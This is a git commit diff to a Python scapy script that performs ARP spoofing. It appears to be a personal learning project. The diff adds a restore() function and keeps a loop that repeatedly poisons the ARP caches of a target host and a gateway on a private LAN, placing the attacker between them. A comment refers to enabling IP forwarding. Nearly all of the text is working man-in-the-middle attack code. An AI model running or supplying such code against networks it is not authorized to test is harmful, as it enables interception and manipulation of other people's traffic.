f29990623dc6262d9083c0156866efad8b31a61e
srezal <sereshka0967@gmail.com>
2022-06-28 06:24:54 -0400

    add restore()

--- main.py
+++ main.py
@@ -16,17 +16,28 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-sent_packets_count = 0
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.31.61"
+gateway_ip = "192.168.31.1"
 try:
+    sent_packets_count = 0
     while True:
-        spoof("192.168.31.1", "192.168.31.61")
-        spoof("192.168.31.61", "192.168.31.1")
+        spoof(gateway_ip, target_ip)
+        spoof(target_ip, gateway_ip)
         sent_packets_count += 2
         print(f"\r[+] Packets sent: {sent_packets_count}", end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C.......Quitting.")
+    print("\n[+] Detected CTRL + C.......Resetting ARP tables.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
 
 
 # IP FORWARDING
-#echo 1 > /proc/sys/net/ipv4_ip_forward
+# echo 1 > /proc/sys/net/ipv4_ip_forward
